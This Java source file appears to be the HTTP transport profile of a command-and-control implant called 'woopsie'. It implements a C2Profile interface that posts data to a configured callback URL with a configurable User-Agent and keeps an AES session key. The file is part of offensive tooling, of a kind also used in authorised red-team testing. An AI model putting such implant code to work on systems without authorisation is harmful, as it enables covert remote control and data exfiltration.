package com.woopsie.profiles;

import com.woopsie.Config;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.io.entity.StringEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;

/**
 * Simple HTTP profile - single endpoint communication
 */
public class HttpProfile implements C2Profile {
    private final Config config;
    private final CloseableHttpClient httpClient;
    private byte[] aesKey;
    
    public HttpProfile(Config config) {
        this.config = config;
        this.httpClient = HttpClients.createDefault();
        this.aesKey = null;
    }
    
    @Override
    public String send(String data) throws Exception {
        String url = config.getCallbackUrl() + config.getPostUri();
        Config.debugLog(config, "HTTP POST to: " + url);
        
        HttpPost post = new HttpPost(url);
        post.setHeader("User-Agent", config.getUserAgent());
        post.setHeader("Content-Type", "application/json");
        post.setEntity(new StringEntity(data));
        
        try (CloseableHttpResponse response = httpClient.execute(post)) {
            int statusCode = response.getCode();
            String responseBody = EntityUtils.toString(response.getEntity());
            
            Config.debugLog(config, "HTTP response status: " + statusCode);
            
            if (statusCode >= 200 && statusCode < 300) {
                return responseBody;
            } else {
                throw new Exception("HTTP request failed with status: " + statusCode);
            }
        }
    }
    
    @Override
    public byte[] getAesKey() {
        return aesKey;
    }
    
    @Override
    public void setAesKey(byte[] key) {
        this.aesKey = key;
    }
    
    @Override
    public String getProfileName() {
        return "http";
    }
}
